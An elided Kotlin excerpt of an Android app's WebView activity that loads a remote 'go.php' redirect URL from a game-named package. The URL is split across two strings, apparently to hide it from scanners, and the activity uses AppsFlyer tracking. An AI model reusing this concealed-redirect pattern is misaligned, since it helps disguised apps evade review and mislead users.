...
import com.ngelgames.her.ApMain.Companion.MAIN_ID
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.ngelgames.her.databinding.ActivityWwwebBinding
...
class WWWeb : AppCompatActivity() {
    ...
    lateinit var bind: ActivityWwwebBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        bind = ActivityWwwebBinding.inflate(layoutInflater)
        ...
        vv.webChromeClient = object : WebChromeClient() {
            ...
            private fun createImageFile(): File {
                var imageStorageDir = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),"DirectoryNameHere"
                )
    ...
    private fun getUrl(): String {
        ...
        val first = "http://sportsworldcup"
        val second = "2022.xyz/go.php?to=2&"
    ...
    fun saveUrl(url: String?) {
        if (!url!!.contains("t.me")) {
            if (firstUrl == "") {
                firstUrl = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE).getString("SAVED_URL", url).toString()
